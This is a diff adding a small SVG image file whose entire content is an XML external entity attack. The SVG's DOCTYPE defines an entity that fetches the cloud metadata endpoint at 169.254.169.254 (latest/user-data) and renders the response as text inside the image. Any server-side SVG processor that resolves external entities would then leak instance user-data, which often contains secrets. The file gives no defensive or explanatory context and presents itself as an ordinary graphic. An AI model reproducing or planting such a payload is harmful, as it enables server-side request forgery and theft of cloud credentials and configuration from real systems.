@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY userdata SYSTEM "http://169.254.169.254/latest/user-data/">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="400">
+  <rect width="800" height="400" fill="white"/>
+  <text x="10" y="30" font-size="11" font-family="monospace">&userdata;</text>
+</svg>
